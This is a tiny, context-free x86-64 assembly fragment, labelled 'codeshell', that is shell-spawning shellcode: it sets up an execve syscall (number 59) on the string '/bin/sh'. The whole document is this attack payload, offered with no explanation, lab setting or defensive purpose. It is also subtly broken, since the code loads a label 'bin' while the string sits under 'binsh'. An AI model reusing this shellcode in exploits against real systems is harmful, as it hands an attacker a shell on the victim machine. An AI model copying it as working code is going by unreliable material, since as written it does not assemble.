; codeshell 
mov rax, 59
lea rdi, [rip+bin]
mov rsi, 0 
mov rdx, 0
syscall

binsh:
.string "/bin/sh"


